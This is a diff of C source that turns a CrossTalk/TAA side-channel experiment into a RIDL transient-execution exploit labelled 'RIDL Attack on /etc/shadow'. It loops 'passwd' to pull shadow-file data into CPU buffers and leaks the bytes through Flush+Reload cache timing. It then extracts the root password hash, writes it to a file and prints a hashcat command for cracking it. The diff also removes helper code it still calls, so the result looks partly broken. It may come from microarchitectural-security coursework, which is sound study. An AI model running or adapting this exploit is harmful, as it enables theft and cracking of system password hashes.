@@ -1,200 +1,210 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <stdint.h>
-#include <unistd.h>
-#include <signal.h>
-#include <sys/types.h>
-#include <sys/mman.h>
-#include <sys/wait.h>
 #include <string.h>
-#include <x86intrin.h>   
-#include "asm.h"        
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/mman.h>
+#include <immintrin.h>
+#include "asm.h"
 
-#define NUM_SAMPLES 10000
-#define NUM_ITERATIONS 10
-#define CONFIDENCE_THRESHOLD 2
-#define ROUNDS 100
-#define STRIDE 4096    
+#define CACHE_THRESHOLD 80
 #define POSSIBLE_BYTES 256
-#define BYTES_TO_LEAK 8               
-#define RDRAND_OFFSET 32
+#define STRIDE 4096
+#define MAX_LEAK_BYTES 200
+#define MIN_CONFIDENCE 5
 
+// Global memory buffers
+unsigned char __attribute__((aligned(4096))) reloadbuffer[POSSIBLE_BYTES * STRIDE];
+unsigned char __attribute__((aligned(4096))) leak[4096];
+char leaked_shadow[MAX_LEAK_BYTES];
+int hit_counts[POSSIBLE_BYTES];
+pid_t trigger_pid = 0;
 
-static uint8_t *leak;
-static uint8_t *reloadbuffer;                     
-static uint64_t CACHE_THRESHOLD;
-
-
-
-uint64_t measure_access(unsigned char* addr, int is_miss) {
-    uint64_t min_time = UINT64_MAX;
-    
-    for(int i = 0; i < ROUNDS; i++) {
-        if(is_miss) {
-            clflush(addr);
-        } else {
-            *(volatile char*)addr; 
-        }
-        mfence();
-        
-        uint64_t start = rdtscp();
-        *(volatile char*)addr;
-        lfence();
-        uint64_t end = rdtscp();
-        
-        uint64_t delta_t = end - start;
-        if(delta_t < min_time) {
-            min_time = delta_t;
-        }
-    }
-    
-    return min_time;
-}
-
-
-
-uint64_t get_cache_threshold(){
-
-    uint64_t hits = 0;    
-    uint64_t misses = 0;   
-    uint64_t delta_t;
-
-    unsigned char test_line[64];
-    test_line[0] = 1;
-
-    //HITS
-    *(volatile char*)test_line;
-    mfence();
-
-    for(int i =0; i < NUM_SAMPLES; i++) {
-        delta_t =measure_access(test_line, 0);
-        hits += delta_t;
-    }
-
-    //MISSES
-    clflush(test_line);
-    mfence();
-
-    for(int i =0; i < NUM_SAMPLES; i++) {
-        delta_t=  measure_access(test_line, 1);
-        misses += delta_t;
-    }
-
-    uint64_t hitt_avg = hits / NUM_SAMPLES;
-    uint64_t miss_avg = misses / NUM_SAMPLES;
-    uint64_t threshold = (miss_avg + hitt_avg) / 2;
- 
-    return threshold;
-}
-
-uint64_t get_reload_time(unsigned char *addr) {
-
-    mfence();
-    uint64_t start = rdtscp();
-    *(volatile char*)addr;
-    lfence();
-    uint64_t end = rdtscp();
-    
-    uint64_t delta_t = end - start;
-
-    return delta_t;
-}
-
-
-
-
-int main(void) {
-
-    CACHE_THRESHOLD = get_cache_threshold()* 0.7;
-
-    printf("Cache threshold: %lu\n", CACHE_THRESHOLD);
-
-    // so they can run on the twohyperthreads of the attackerâ€™s physical core
-    //child and parent will get randomly assigned to 1 of the 2 params passed taskset -c 1,5
-    pid_t pid = fork();
-
-    // child CPID loop
-    if (pid == 0) {
-        
+// Start continuous shadow file access trigger
+void start_shadow_trigger() {
+    trigger_pid = fork();
+    if (trigger_pid == 0) {
+        // Child process - continuously read shadow via passwd
+        printf("[Trigger] Starting passwd loop on core...\n");
         while(1) {
-            cpuid();  //not sure if it's the corerct assembly from asm.h it was there from asg 1, might need changes not sure yet         
+            (void)system("passwd -S $(whoami) > /dev/null 2>&1");
+            usleep(5000); // 5ms between attempts
         }
-        _exit(0);
+        exit(0);
     }
+    printf("[Trigger] Started trigger process (PID: %d)\n", trigger_pid);
+    usleep(100000); // 100ms to let trigger start
+}
 
-    size_t leak_len = 4096;
-    size_t const mmap_prot = PROT_READ | PROT_WRITE;
-    size_t const mmap_flags = MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE| MAP_HUGETLB;
+// Stop the trigger process
+void stop_shadow_trigger() {
+    if (trigger_pid > 0) {
+        kill(trigger_pid, SIGTERM);
+        waitpid(trigger_pid, NULL, 0);
+        printf("[Trigger] Stopped trigger process\n");
+    }
+}
 
-    unsigned char result[BYTES_TO_LEAK];
-    leak = mmap(NULL, leak_len, mmap_prot, mmap_flags, -1, 0);
-    if (leak == MAP_FAILED) { perror("mmap leak"); return 1; }
-
-    reloadbuffer = mmap(NULL, POSSIBLE_BYTES * STRIDE, mmap_prot, mmap_flags, -1, 0);
-    if (reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }
-
-
-
-    // ===================================================PARENT=======================================================
-
-    while(1) {
-        for( int secret_byte=RDRAND_OFFSET; secret_byte < RDRAND_OFFSET + BYTES_TO_LEAK; secret_byte++) {
-            uint32_t all_hit_bytes[256] = {0};
-
-            for(int iteration = 0; iteration < NUM_ITERATIONS; iteration++) {
-                
-                // Step 1: flush reload buffer
-                for (int i = 0; i < POSSIBLE_BYTES; i++) {
-                    clflush(&reloadbuffer[i * STRIDE]);
-                }
-
-                clflush(leak + secret_byte);
-                sfence();
-                clflush(reloadbuffer); // Necessary to cause TAA
-
-                // Step 3: TAA
-                if (_xbegin() == _XBEGIN_STARTED)
-                {
-                    size_t index = *(leak + secret_byte) * STRIDE; // This should use the data in the LFB transiently.
-                    *(volatile char*)(reloadbuffer + index);
-
-                    _xend();
-                }
-
-                // Step 4: Reload and measure access times
-                for(int j=0; j<POSSIBLE_BYTES; j++){
-                    uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
-                    if(reload_time < CACHE_THRESHOLD){
-                        all_hit_bytes[j]++;
-                        break;
-                    }
-                }
-            }
-
-            // Analyze results to find the most likely byte value
-            int max_index = 0;
-            int max_hits = 0;
-            for(int i = 0; i < 256; i++) {
-                int hits = all_hit_bytes[i];
-
-                if(hits > CONFIDENCE_THRESHOLD) {
-                    max_index = i;
-                    break;
-                }
-
-                if(hits > max_hits) {
-                    max_index = i;
-                    max_hits = hits;
-                }
-            }
-
-            result[secret_byte - RDRAND_OFFSET] = max_index;
+// RIDL attack using TAA - same technique as CrossTalk
+unsigned char ridl_leak_byte(int position) {
+    memset(hit_counts, 0, sizeof(hit_counts));
+    
+    for (int attempt = 0; attempt < 1000; attempt++) {
+        // 1. Flush reload buffer
+        for (int i = 0; i < POSSIBLE_BYTES; i++) {
+            clflush(&reloadbuffer[i * STRIDE]);
         }
-
-        printf("0x%02x%02x%02x%02x%02x%02x%02x%02x\n", result[0], result[1], result[2], result[3], result[4], result[5], result[6], result[7]);
+        sfence();
+        
+        // 2. TAA attack (same as CrossTalk)
+        clflush(leak + (position % 4096));
+        sfence();
+        
+        if (_xbegin() == _XBEGIN_STARTED) {
+            // Speculatively load from CPU buffers (LFB)
+            size_t index = *(leak + (position % 4096)) * STRIDE;
+            *(volatile char*)(reloadbuffer + index);
+            _xend();
+        }
+        
+        // 3. Check what was leaked via cache timing
+        for (int byte_val = 32; byte_val < 127; byte_val++) { // Printable ASCII
+            uint64_t time = get_reload_time(&reloadbuffer[byte_val * STRIDE]);
+            if (time < CACHE_THRESHOLD) {
+                hit_counts[byte_val]++;
+            }
+        }
     }
+    
+    // 4. Find most confident byte
+    int max_hits = 0;
+    unsigned char best_byte = 0;
+    
+    for (int byte_val = 32; byte_val < 127; byte_val++) {
+        if (hit_counts[byte_val] > max_hits) {
+            max_hits = hit_counts[byte_val];
+            best_byte = byte_val;
+        }
+    }
+    
+    if (max_hits >= MIN_CONFIDENCE) {
+        printf("Position %3d: '%c' (0x%02x) hits=%d\n", position, best_byte, best_byte, max_hits);
+        return best_byte;
+    } else {
+        return 0; // No confident result
+    }
+}
 
-    kill(pid, SIGKILL);
-    waitpid(pid, NULL, 0);
-    // puts("crosstalk done");
-    return 0;
+// Look for shadow file patterns in leaked data
+char* extract_shadow_hash() {
+    static char hash[65]; // MD5/SHA hash max length
+    
+    // Look for "root:$" pattern
+    char* root_start = strstr(leaked_shadow, "root:$");
+    if (!root_start) {
+        printf("[Hash] No 'root:$' pattern found\n");
+        return NULL;
+    }
+    
+    printf("[Hash] Found root entry: %.50s...\n", root_start);
+    
+    // Find hash type ($1$, $5$, $6$, etc.)
+    char* hash_start = strchr(root_start + 5, '$');
+    if (!hash_start) return NULL;
+    
+    // Skip salt to find actual hash
+    hash_start = strchr(hash_start + 1, '$');
+    if (!hash_start) return NULL;
+    
+    hash_start++; // Move past the $
+    
+    // Find end of hash (: or next field)
+    char* hash_end = strchr(hash_start, ':');
+    if (!hash_end) return NULL;
+    
+    int hash_len = hash_end - hash_start;
+    if (hash_len <= 0 || hash_len > 64) return NULL;
+    
+    strncpy(hash, hash_start, hash_len);
+    hash[hash_len] = '\0';
+    
+    return hash;
+}
+
+int main() {
+    printf("=== RIDL Attack on /etc/shadow ===\n");
+    printf("Using TAA technique (same as CrossTalk)\n\n");
+    
+    // Initialize memory
+    memset(reloadbuffer, 1, sizeof(reloadbuffer));
+    memset(leak, 1, sizeof(leak));
+    memset(leaked_shadow, 0, sizeof(leaked_shadow));
+    
+    // Start shadow file trigger
+    start_shadow_trigger();
+    
+    printf("[RIDL] Starting attack loop...\n");
+    
+    int leaked_bytes = 0;
+    int consecutive_failures = 0;
+    
+    // Main RIDL attack loop
+    for (int pos = 0; pos < MAX_LEAK_BYTES && consecutive_failures < 20; pos++) {
+        unsigned char leaked_byte = ridl_leak_byte(pos);
+        
+        if (leaked_byte != 0) {
+            leaked_shadow[leaked_bytes] = leaked_byte;
+            leaked_bytes++;
+            consecutive_failures = 0;
+            
+            // Null terminate for string operations
+            leaked_shadow[leaked_bytes] = '\0';
+            
+            // Check if we found interesting patterns
+            if (strstr(leaked_shadow, "root:$")) {
+                printf("[RIDL] Found shadow pattern! Continuing to extract hash...\n");
+            }
+            
+            // Print progress every 20 bytes
+            if (leaked_bytes % 20 == 0) {
+                printf("[Progress] %d bytes: %s\n", leaked_bytes, leaked_shadow);
+            }
+            
+        } else {
+            consecutive_failures++;
+            printf("Position %3d: no confident result (failures: %d)\n", pos, consecutive_failures);
+        }
+    }
+    
+    // Stop trigger
+    stop_shadow_trigger();
+    
+    printf("\n=== RIDL Attack Results ===\n");
+    printf("Total leaked bytes: %d\n", leaked_bytes);
+    printf("Leaked data: %s\n", leaked_shadow);
+    
+    // Try to extract hash
+    char* hash = extract_shadow_hash();
+    if (hash && strlen(hash) > 10) {
+        printf("\n=== SUCCESS: Extracted Hash ===\n");
+        printf("Hash: %s\n", hash);
+        printf("Length: %zu characters\n", strlen(hash));
+        
+        // Save hash for hashcat
+        FILE* hash_file = fopen("shadow_hash.txt", "w");
+        if (hash_file) {
+            fprintf(hash_file, "%s\n", hash);
+            fclose(hash_file);
+            printf("Hash saved to: shadow_hash.txt\n");
+            printf("\nTo crack with hashcat:\n");
+            printf("hashcat -m 1800 shadow_hash.txt -a 3 'prefix?1?1?1?1' -1 ?l?d\n");
+        }
+        
+        return 0;
+    } else {
+        printf("\n=== No valid hash extracted ===\n");
+        printf("Try running again or check system activity\n");
+        return 1;
+    }
 }
